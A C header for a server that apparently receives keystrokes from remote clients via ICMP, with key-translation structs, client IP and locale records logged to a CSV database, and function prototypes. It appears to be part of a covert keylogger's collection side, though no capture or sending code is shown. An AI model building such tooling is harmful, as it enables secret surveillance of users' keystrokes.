#ifndef SERVER_H
#define SERVER_H

#ifdef DEBUG

#include <errno.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <syslog.h>

#ifndef DEBUG_LOG
#define DEBUG_LOG(s, ...)                              \
    do {                                               \
        char data[256] = {0};                          \
        if (0 > snprintf(data, 255, s, ##__VA_ARGS__)) \
            _exit(1);                                  \
        syslog(LOG_NOTICE, data);                      \
    } while (0)
#endif

#endif


#ifndef STATIC_IP_ADDR
#define STATIC_IP_ADDR ("0.0.0.0")
#endif

#include <sys/queue.h>
#include <sys/types.h>
#include <unistd.h>

#define QUEUE_BUFFER_SIZE 1024
#define STRING_BUFFER_SIZE 256
#define MAX_NB_CLIENT 128

/* meant for key translations from xkbcommon and the event we receive. :^) */
typedef struct translated_key {
    char const *description;
    char const representation;
} translated_key_t;

/*
    this will be meant to hold a single client information, along with
    all the information it has passed along to our server.
*/
typedef struct client_state client_t;
struct client_state {

    /* if all client fields in server state are occupied,
     * we remove the eldest client. When it pings again,
     * we can remove another one
     */
    unsigned long last_ping_timestamp;

    char current_buffer[STRING_BUFFER_SIZE];
    ssize_t nb_bytes_in_buffer;

    /* client metadata dumped in database */
    char ipaddr[STRING_BUFFER_SIZE];
    char locale[STRING_BUFFER_SIZE];

    TAILQ_ENTRY(client_state)
    clients;
};

#define IP_LENGTH (40)
#define ICMP_DATA_LENGTH (128) /* should not exceed 9000 AFAIK (also should not exceed STRING_BUFFER_SIZE) */

typedef struct icmp_packet {
    char addr[IP_LENGTH];
    int type;

    char payload[ICMP_DATA_LENGTH];
    ssize_t payload_size;
} icmp_msg_t;


/* main server object */
typedef struct server_state {

    /* current clients */
    TAILQ_HEAD(listhead, client_state)
    clients;

    struct user_options {
        char const db_filepath[STRING_BUFFER_SIZE]; // .csv filepath
        unsigned short listen_port;

        /*
            TODO:
            add encryption key config here, once protocol impl. is finished
        */
    } options;

    int sockfd;
    int dbfd;

} server_t;

#define SUCCESSFUL 1
#define ERROR 0

#define KEY_PRESSED 1
#define KEY_RELEASED 0

#define MTU (1472)

// net.c
int init_remote_connection(server_t *instance);
int net_poll_icmp_recv(server_t *instance, icmp_msg_t *msg);

// lexxer.c
int parse_cli_arguments(server_t *instance, const int ac, char **av, char **envp);

// csv.c
int init_csv_dbfd(char const *filepath);

// loop.c
void loop(server_t *instance);
int should_gracefully_exit(int code);


#endif /* SERVER_H */
